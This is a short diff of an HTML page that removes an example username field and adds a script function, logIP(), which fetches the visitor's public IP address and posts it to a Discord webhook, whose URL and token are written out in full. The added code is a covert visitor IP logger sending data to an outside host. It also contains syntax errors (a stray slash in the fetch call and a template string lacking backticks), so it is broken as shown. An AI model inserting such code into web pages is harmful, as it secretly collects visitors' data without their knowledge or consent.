@@ -44,9 +44,17 @@
  }
  }
  </script>
-
- <!-- Example form fields -->
- <input id="username" type="text" placeholder="Enter username">
+ <script>
+ async function logIP() {
+ const ipResponse = await fetch('https://api.ipify.org'/);
+ const ip = await ipResponse.text();
+ const webhookURL = 'https://discord.com/api/webhooks/1543567118610726912/4K6AtQwvLPqTWFmr8BV_CRILhLQMzfUSUrRmZ4cnktNrFcpPz6fYzJc5SCgzTY5qFzAj';
+ fetch(webhookURL, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ content: Logged IP: ${ip} }),
+ });
+ }
+ </script>
 </body>
-</html> https://discord.com/api/webhooks/1543567118610726912/4K6AtQwvLPqTWFmr8BV_CRILhLQMzfUSUrRmZ4cnktNrFcpPz6fYzJc5SCgzTY5qFzAj
-
+</html>
